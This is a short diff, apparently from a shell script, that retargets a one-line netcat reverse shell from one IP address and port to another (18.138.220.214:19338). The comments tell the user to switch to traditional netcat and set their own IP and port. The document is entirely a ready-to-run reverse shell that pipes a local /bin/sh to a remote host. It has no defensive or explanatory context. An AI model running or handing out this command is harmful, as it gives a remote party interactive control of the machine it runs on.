@@ -3,5 +3,5 @@
 # if you will execute "sudo update-alternatives --config nc" and choose traditional 
 # Dont forget to change IP and PORT to your
 
-tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 52.74.74.86 12974 1> /tmp/1
+tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 18.138.220.214 19338 1> /tmp/1
 
